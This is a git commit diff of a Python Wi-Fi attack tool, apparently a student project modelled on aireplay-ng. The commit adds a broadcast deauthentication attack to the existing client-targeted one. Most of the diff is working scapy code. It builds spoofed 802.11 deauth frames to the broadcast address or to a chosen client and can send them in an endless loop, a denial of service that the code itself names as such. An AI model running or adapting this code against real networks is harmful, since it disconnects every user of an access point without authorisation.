7b661640cd0a9fdae668de68dadd0ac0e7df63d2
Imad-Belatreche <imad.belatreche@etu.usthb.dz>
2025-10-23 18:54:51 +0100

    Added function: Broadcast deauth attack + Better terminal logs + Better code organization

--- hitsuit/hitplay.py
+++ hitsuit/hitplay.py
@@ -3,8 +3,8 @@
 
 import argparse
 import os
-import re
 import sys
+import time
 import argcomplete
 from argcomplete.completers import ChoicesCompleter
 
@@ -14,13 +14,13 @@ SCRIPT_DIR = Path(__file__).resolve().parent
 if str(SCRIPT_DIR) not in sys.path:
     sys.path.insert(0, str(SCRIPT_DIR))
 
-from helpers import add_interface_argument, check_interface, check_mac
+from helpers import add_interface_argument, check_interface, check_mac, check_monitor
 
 if "_ARGCOMPLETE" not in os.environ:
     from colorama import Fore
     from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
     from scapy.all import sendp
-    from helpers import check_root, run_command
+    from helpers import check_root
 
 # TODO: Make it run on windows
 # TODO: Needs deep testing
@@ -40,44 +40,9 @@ ATTACK_DEFINITIONS = [
 ]
 
 
-def _check_monitor(interface):
-    out, err = run_command(f"iw dev {interface} info")
-    if err:
-        print(f"{Fore.RED}An error occured: {err}")
-        return False
-
-    wireless_types = ["ibss", "monitor", "mesh", "wds", "managed"]
-
-    for type in wireless_types:
-        search = re.search(type, out)
-        if search is not None:
-            break
-    result = search.group(0)
-
-    if result == "monitor":
-        return True, None
-    else:
-        return False, result
-
-
-def _deauth_attack(interface, bssid, client, count):
-    """
-    Performs the deauthentication attack.
-
-    :param interface: The wireless interface to use.
-    :param bssid: The MAC address of the access point.
-    :param client: The MAC address of the client to deauthenticate.
-    :param count: The number of deauthentication packets to send.
-    """
-    is_monitor, _ = _check_monitor(interface=interface)
-    if not is_monitor:
-        print(
-            f"{Fore.RED}Interface is not in monitor mode (current mode: {_}).\nUse hitmon to enable monitor mode."
-        )
-        sys.exit(1)
-
-    print(f"Starting deauthentication attack on {bssid} for client {client}")
-
+# Deauthenticaion attack
+def _create_client_attack_packets(bssid, client):
+    """Create packets for client specified deauthentication attack."""
     packet_to_client = (
         RadioTap()
         / Dot11(addr1=client, addr2=bssid, addr3=bssid)
@@ -89,21 +54,78 @@ def _deauth_attack(interface, bssid, client, count):
         / Dot11(addr1=bssid, addr2=client, addr3=bssid)
         / Dot11Deauth(reason=7)
     )
+    return [packet_to_ap, packet_to_client]
 
-    packets = [packet_to_ap, packet_to_client]
-    print("Sending deauthentication packets... Press Ctrl+C to stop.")
+
+def _create_broadcast_attack_packets(bssid):
+    """Create packet for broadcast deauthentication attack (DoS)"""
+    broad_cast = "ff:ff:ff:ff:ff:ff"
+    packet = (
+        RadioTap()
+        / Dot11(addr1=broad_cast, addr2=bssid, addr3=bssid)
+        / Dot11Deauth(reason=7)
+    )
+    return [packet]
+
+
+def _excute_attack_packets(interface, packets, count):
+    """Excute the deauth attack with given packets"""
+    print("Sending deauthentication packets... Press Ctrl+C to stop")
 
     sent_count = 0
     loop_forever = count == 0
+
+    if len(packets) == 2 or len(packets) == 1:
+        nbr_packets = len(packets)
+    else:
+        print(f"{Fore.RED}Unexpected error: Number of packets is broken !{Fore.RESET}")
+        sys.exit(1)
+
     try:
         while loop_forever or sent_count < count:
             sendp(packets, iface=interface, verbose=False, count=1)
-            sent_count += 1
-            print(f"\rPackets sent: {sent_count}", end="")
+            sent_count += nbr_packets
+            if (sent_count % 10) == 0 or sent_count == count:
+                print(f"\rPackets sent: {sent_count}", end="", flush=True)
+            if loop_forever:
+                time.sleep(0.01)
+
     except KeyboardInterrupt:
         print("\nAttack stopped by user.")
+    except Exception as e:
+        print(f"\nError durring attack: {e}")
     finally:
         print(f"\nTotal packets sent: {sent_count}")
+
+
+def _deauth_attack(interface, bssid, count, client=None):
+    """
+    Performs the deauthentication attack.
+
+    :param interface: The wireless interface to use.
+    :param bssid: The MAC address of the access point.
+    :param client: The MAC address of the client to deauthenticate.
+    :param count: The number of deauthentication packets to send.
+    """
+    is_monitor, _ = check_monitor(interface=interface)
+    if not is_monitor:
+        print(
+            f"{Fore.RED}Interface is not in monitor mode (current mode: {_}).\nUse hitmon to enable monitor mode."
+        )
+        sys.exit(1)
+    # Create packets based on attack type
+    if client is not None:
+        print(
+            f"{Fore.GREEN}Starting deauthentication attack on {client} station in {bssid} acces point...{Fore.RESET}"
+        )
+        packets = _create_client_attack_packets(bssid, client)
+    else:
+        print(
+            f"{Fore.GREEN}Starting broadcast deauthentication attack on AP {bssid}...{Fore.RESET}"
+        )
+        packets = _create_broadcast_attack_packets(bssid)
+
+    _excute_attack_packets(interface, packets, count)
 
 
 def main():
@@ -152,6 +174,7 @@ def main():
             attack_parser.add_argument(
                 "-c",
                 "--client",
+                required=False,
                 help="MAC address of the client.",
             )
             attack_parser.add_argument(
@@ -174,33 +197,43 @@ def main():
 
     check_root()
 
-    print("Starting hitplay-ng...")
+    print(f"{Fore.YELLOW}Starting hitplay-ng...{Fore.RESET}")
     check_interface(args.interface)
-    print(f"Interface: {args.interface}")
-    print(f"Attack Mode: {args.attack}")
+    print(f"{Fore.YELLOW}+==============================================+{Fore.RESET}")
+    print(f"{Fore.YELLOW}| Interface:{Fore.RESET} {args.interface}")
+    print(f"{Fore.YELLOW}| Attack Mode:{Fore.RESET} {args.attack}")
 
     bssid = getattr(args, "bssid", None)
     client = getattr(args, "client", None)
 
     if bssid:
         check_mac(bssid)
-        print(f"Target BSSID: {args.bssid}")
+        print(f"{Fore.YELLOW}| Target BSSID:{Fore.RESET} {args.bssid}")
     if client:
         check_mac(client)
-        print(f"Target Client: {args.client}")
+        print(f"{Fore.YELLOW}| Target Client:{Fore.RESET} {args.client}")
 
     if args.attack == "deauth":
-        print(f"Deauth Count: {args.count}")
-        if not bssid or not client:
+        if args.count == 0:
+            count = "Infinity ∞"
+        else:
+            count = args.count
+        print(f"{Fore.YELLOW}| Deauth Count:{Fore.RESET} {count}")
+        print(f"{Fore.YELLOW}+==============================================+")
+        if not bssid:
             print(
-                "Deauthentication attack requires both --bssid (-b) and --client (-c)."
+                f"{Fore.RED}Deauthentication attack requires AP mac address --bssid (-b).{Fore.RESET}"
             )
             sys.exit(1)
+        if not client:
+            print(
+                f"{Fore.YELLOW}No client (station) mac address given. Initiating broadcast deauthentication...{Fore.RESET}"
+            )
 
-        _deauth_attack(args.interface, bssid, client, args.count)
+        _deauth_attack(args.interface, bssid, args.count, client)
 
     else:
-        print(f"Attack '{args.attack}' is not implemented yet.")
+        print(f"{Fore.RED}Attack '{args.attack}' is not implemented yet.{Fore.RESET}")
 
 
 if __name__ == "__main__":
